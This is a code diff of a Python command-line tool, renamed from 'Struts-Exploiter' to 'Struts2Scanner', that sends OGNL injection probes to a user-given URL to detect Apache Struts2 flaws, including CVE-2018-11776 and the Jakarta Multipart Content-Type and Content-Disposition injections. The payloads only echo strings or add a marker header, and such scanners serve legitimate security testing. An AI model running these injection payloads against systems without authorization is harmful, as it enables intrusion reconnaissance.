@@ -7,21 +7,25 @@ from urllib.parse import urlparse, parse_qs, quote, unquote
 from http.cookies import SimpleCookie
 import re
 import copy
+from colorama import Fore, Style
+
+bracket = f"{Fore.BLUE}[{Fore.GREEN}*{Fore.BLUE}]{Style.RESET_ALL}"
+bracket_err = f"{Fore.BLUE}[{Fore.RED}*{Fore.BLUE}]{Style.RESET_ALL}"
 
 if len(sys.argv) <= 1:
-    print('[*] Struts-Exploiter - gh0st27')
+    print(bracket, 'Struts2Scanner - gh0st27')
     print('\n%s -h for help.' % (sys.argv[0]))
     exit()
 
 def get_parser():
-    parser = argparse.ArgumentParser(prog='Struts-Exploiter.py', usage='Struts-Exploiter.py [options] --url "http://www.site.com/vuln.php?id=1"')
+    parser = argparse.ArgumentParser(prog='Struts2Scanner.py', usage='Struts2Scanner.py [options] --url "http://www.site.com/vuln.php?id=1"')
     parser.add_argument('-u', '--url',
                         dest="url",
-                        help='Target URL (e.g."http://www.site.com/vuln.php?id=1")',
+                        help='Target URL (e.g."http://www.site.com/vuln.php?id=1&fname=test&lname=tester")',
                         action='store'
                        )
     parser.add_argument('--data', dest='data',
-                        help='Data string to be sent through POST (e.g. "id=1")', action='store'
+                        help='Data string to be sent through POST (e.g. "id=1&fname=test&lname=tester")', action='store'
                        )
     parser.add_argument('--cookies', dest='cookies',
                         help='HTTP cookies (eg. "jsessionid=1234")',action='store'
@@ -51,7 +55,7 @@ def do_Multipart_Post_Request(ttarget, multipart_payload, dict_cookies, proxies_
                 output += i
             r_headers =  response.headers
     except requests.exceptions.RequestException as e:
-        print(e)
+        print(bracket_err, e)
         exit()
     return output, r_headers
 
@@ -64,7 +68,7 @@ def do_Get(ttarget, dict_params, dict_cookies, proxies_listener, timeout, hheade
                 output += i
             r_headers = response.headers
     except requests.exceptions.RequestException as e:
-        print(e)
+        print(bracket_err, e)
         exit()
     return output, r_headers
 
@@ -77,7 +81,7 @@ def do_Post(ttarget, raw_data, dict_cookies, proxies_listener, timeout, hheaders
                 output += i
             r_headers = response.headers
     except requests.exceptions.RequestException as e:
-        print(e)
+        print(bracket_err, e)
         exit()
     return output, r_headers
 
@@ -97,7 +101,7 @@ def main():
     elif parsed_url.scheme =='https':
         ns_target = parsed_url.scheme + "://" + parsed_url.netloc
     else:
-        print("There is somering wrong with the url")
+        print(bracket_err, 'Target URL must start with http or https (e.g."http://www.site.com/vuln.php" )')
         exit()
 
     path = parsed_url.path
@@ -109,10 +113,8 @@ def main():
         cookies = {}
         for key, morsel in cookie.items():
             cookies[key] = morsel.value
-            print(cookies, type(cookies))
     else:
         cookies = None
-        print("cookie value is None")
 
     #Setup proxy listener
     if proxy is not None and proxy != '':
@@ -145,72 +147,66 @@ def main():
 
     #checking for ambigiuos request
     if raw_data is not None and bool(dict_param):
-        print("iReqeust is ambigious.\n [*]Exiting......")
+        print(bracket_err, "Malformed Request Found.\n Exiting......")
         exit()
-    else:
-        print("Reuest seems okay..")
 
     check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow_redirects, verify, dict_cookies, proxies_listener)
 
 def check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow_redirects, verify, dict_cookies, proxies_listener):
 
     #OGNL Injection
-    print("[*] checking for OGNL Injection")
     ttarget = copy.copy(target)
     hheaders = headers.copy()
     check_payload = 'ghost${"zkzz".toString().replace("k", "z")}'
     if raw_data is not None:
-        print("Performing OGNL injection on Post parameters.........")
         data_url_decoded = unquote(raw_data)
         dict_data = dict(subString.split("=") for subString in data_url_decoded.split("&"))
         for key in dict_data.keys():
             temp_dict_data = dict_data.copy()
             temp_dict_data[key] = check_payload
-            print('Checking POST  parameter {} for OGNL Injection using payload {} ........'.format(key, check_payload))
+#            print('Checking POST parameter {} for OGNL Injection using payload " {} " '.format(key, check_payload))
             output, r_headers = do_Post(ttarget, temp_dict_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
             match = re.search(r'ghostzzzz', str(output))
             if match:
-                print("[+] target is vulnerable OGNL Injection")
+                print(bracket, "POST parameter '{}' is vulnerable OGNL Injection".format(key))
             else:
-                print("[-] target not vulnerable to OGNL Injectin")
+                print(bracket_err, "POST parameter '{}' is not vulnerable to OGNL Injectin".format(key))
             temp_dict_data.clear()
     else:
-        print("performing oGNL injection on Query strings")
         for key in dict_param.keys():
             temp = dict_param.copy()
             temp[key] = check_payload
-            print('Checking Get parameter {} for OGNL Injection using payload {} ........'.format(key, check_payload))
+#            print('Checking GET parameter {} for OGNL Injection using payload  " {} " '.format(key, check_payload))
             output, r_headers = do_Get(ttarget, dict_param, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
             match = re.search(r'ghostzzzz', str(output))
             if match:
-                print("[+] target is vulnerable OGNL Injection")
+                print(bracket, "GET Query paramater '{}' is vulnerable OGNL Injection".format(key))
             else:
-                print("[-] target not vulnerable to OGNL Injectin")
+                print(bracket_err, "GET Query Parameter '{}' is not vulnerable to OGNL Injectin".format(key))
             temp.clear()
 
     #checking for namespace redirect cve-2018-11776
     if raw_data is not None:
         del ttarget
         ttarget = ns_target + "/" + quote(check_payload) + path
-        print('checking Namespace Redirect OGNL Injection using payload {}...'.format(check_payload))
+ #       print('Checking Namespace Redirect OGNL Injection using payload " {} " '.format(check_payload))
         output, r_headers = do_Post(ttarget, dict_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
         match = re.search(r'ghostzzzz', str(output))
         if match:
-            print("[+] target is vulnerable to Namespace Redirect OGNL Injection")
+            print(bracket, "Target is vulnerable to Namespace Redirect OGNL Injection")
         else:
-            print("[-] target is not vulnerable to Namespace Redirect OGNL Injection")
+            print(bracket_err, "Target is not vulnerable to Namespace Redirect OGNL Injection")
 
     else:
-        print("Preforming Namespace Redirect OGNL Injection...sending GET request")
         del ttarget
         ttarget = ns_target + "/" + quote(check_payload) + path
-        print('checking Namespace Redirect OGNL Injection using payload {}...'.format(check_payload))
+ #       print('Checking Namespace Redirect OGNL Injection using payload " {} " '.format(check_payload))
         output, r_headers = do_Get(ttarget, dict_param, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
         match = re.search(r'ghostzzzz', str(output))
         if match:
-            print("[+] target is vulnerable to Namespace Redirect OGNL Injection")
+            print(bracket, "Target is vulnerable to Namespace Redirect OGNL Injection")
         else:
-            print("[-] target is not vulnerable to Namespace Redirect OGNL Injection")
+            print(bracket_err, "Target is not vulnerable to Namespace Redirect OGNL Injection")
 
     # Checking for Jakarta Multipart parser OGNL Injection - Content type header
     multipart_payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('strutsExploiter','gh0st27')}.multipart/form-data"
@@ -218,38 +214,37 @@ def check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow
     del ttarget
     ttarget = target
     if raw_data is not None:
-        print('checking Jarkarta Multipart parser OGNL Injection on Content Type header using payload {} '.format(str(multipart_payload)))
+#        print('Checking Jarkarta Multipart parser OGNL Injection on Content Type header')
         payload, r_headers = do_Post(ttarget, dict_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects=False)
         if 'strutsExploiter' in r_headers.keys():
             if r_headers['strutsExploiter'] == 'gh0st27':
-                print("[+] target is vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
+                print(bracket, "Target is vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
         else:
-            print("[-] target is not vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
+            print(bracket_err, "Target is not vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
     else:
-        print('checking Jarkarta Multipart parser OGNL Injection on Content Type header using payload {} '.format(str(multipart_payload)))
+#        print('Checking Jarkarta Multipart parser OGNL Injection on Content Type header')
         payload, r_headers = do_Get(ttarget, dict_param, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects=False)
         if 'strutsExploiter' in r_headers.keys():
             if r_headers['strutsExploiter'] == 'gh0st27':
-                print("[+] target is vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
+                print(bracket, "Target is vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
             else:
-                print("[-] target is not vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
+                print(bracket_err, "Target is not vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
         hheaders.clear()
 
     # Checking for Jakarta Multipart parser OGNL Injection - Content disposition header
-    print("Chekcing Jakarta based file upload Multipart parser: Content-Disposition")
     ttarget = copy.copy(target)
     payload, r_headers = do_Multipart_Post_Request(ttarget, multipart_payload, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects=False)
     if 'strutsExploiter' in r_headers.keys():
         if r_headers['strutsExploiter'] == 'gh0st27':
-            print("[+] Target is vulnerable to Jakarta based file upload Multipart parser: Content-Disposition")
+            print(bracket, "Target is vulnerable to Jakarta based file upload Multipart parser on Content Disposition")
     else:
-        print("[-] Target is not vulnerable to Jakarta based file upload Multipart parser: Content-Disposition")
+        print(bracket_err, "Target is not vulnerable to Jakarta based file upload Multipart on Content Disposition")
 
 
 if __name__ =='__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print('\n[*]KeyboardInterrupt Detected.')
-        print('[*]Exiting...')
+        print('\n', bracket_err, 'KeyboardInterrupt Detected.')
+        print(bracket_err, 'Exiting...')
         exit()
